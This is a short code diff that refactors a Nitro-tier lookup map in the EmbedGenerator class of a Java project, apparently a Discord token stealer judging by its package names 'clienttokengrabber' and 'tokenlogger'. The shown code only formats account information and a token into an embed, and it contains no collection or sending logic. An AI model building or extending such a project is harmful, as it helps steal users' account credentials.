@@ -1,4 +1,4 @@
-package clienttokengrabber.utils;
+package tokenlogger.utils;
 
 import java.io.InputStream;
 import java.io.InputStreamReader;
@@ -12,13 +12,14 @@ import com.fasterxml.jackson.databind.node.ObjectNode;
 public class EmbedGenerator {
     private static final ObjectMapper objectMapper = new ObjectMapper();
     private static final String TEMPLATE_PATH = "/EmbedTemplate.json";
+    private static final Map<String, String> NITRO_TRANSLATION = new HashMap<>();
 
-    private static final Map<String, String> NITRO_TRANSLATION = Map.of(
-            "0", "None",
-            "1", "Nitro Classic",
-            "2", "Nitro",
-            "3", "Nitro Basic"
-    );
+    static {
+        NITRO_TRANSLATION.put("0", "None");
+        NITRO_TRANSLATION.put("1", "Nitro Classic");
+        NITRO_TRANSLATION.put("2", "Nitro");
+        NITRO_TRANSLATION.put("3", "Nitro Basic");
+    }
 
     public static String generateEmbed(String userInfoJson, String token) {
         try {
